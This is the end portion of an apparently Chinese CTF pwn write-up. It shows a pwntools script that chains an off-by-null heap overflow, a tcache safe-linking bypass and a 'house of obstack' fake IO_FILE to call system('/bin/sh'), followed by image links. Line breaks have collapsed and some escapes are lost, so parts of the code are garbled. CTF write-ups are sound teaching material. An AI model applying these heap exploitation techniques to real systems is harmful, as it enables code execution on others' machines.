# 因为off by null是写一个字节，所以chunk的size最好是0x100这种最后一个字节为0x00的，不然会报错，所以我之前申请的都是malloc(0xe0+16)add(11,0xe8,b'',b'',payload2)dele(11)
# free chunk8，此时tcachebin又满了dele(12)
# free chunk9，触发unlink，把chunk7，8，9合并成一个big chunk存入unsorted binsystem = libc_base + libc.symbols['system']bin_sh = libc_base +next(libc.search(b'/bin/shx00'))IO_list_all = libc_base + libc.symbols['_IO_list_all']io_list = (heap_base +0x12d0) >>12^ IO_list_all
# 覆盖next指针用的，为了绕过safe-linking_IO_obstack_jumps = libc_base +0x2173c0payload3 =b'a'*0xc8+ p64(0x101) + p64(io_list)add(13,0x2c0,b'',b'',payload3)
# 申请回big chunk，覆写chunk8的next指针add(14,0xe0,b'',b'',b'')
# 申请chunk8
# -------------------------house of obstack------------------------------add(15,0xe0,p64(heap_base+0x740),b'',b'')
# 申请我们指向的IO_list_all，这里heap_base+0x740写的是chunkC+0x20的地址dele(2)
# free chunkCpayload4 = flat( {0x18:1,0x20:0,0x28:1,0x30:0,0x38:
p64(system),0x48:
p64(bin_sh),0x50:1,0xd8:
p64(_IO_obstack_jumps+0x20),0xe0:
p64(heap_base +0x740), }, filler ='x00' )#申请回chunkC并伪造IO_fileadd(2,0x420,b'',b'',payload4)#退出程序触发利用链io.sendlineafter("input your choice:",b'4')io.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773490359-wxsync-2026-03-097380214e1667dd69a86fda3794b249.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773490360-wxsync-2026-03-bd7148469b34877a59e917eca3e82ac6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773490361-wxsync-2026-03-669f1b550856748faae3cc86302aa603.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773490363-wxsync-2026-03-33bce2354ffebadcfa102fd2f2e5e9c8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773490364-wxsync-2026-03-7db6605cd83cc365378468dc35f61bd2.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773490365-wxsync-2026-03-39bcb40e75ac390aba127893776ab85e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773490367-wxsync-2026-03-62ed53a056386a6aa471681d78659e09.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773490369-wxsync-2026-03-82f0d3f7c412f564bcf16ecf6f54707f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773490370-wxsync-2026-03-2426f766ae35393a1e15600240bdb094.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/03/1773490372-wxsync-2026-03-f36f72ed81ff03c16867fbaf44706ce9.png)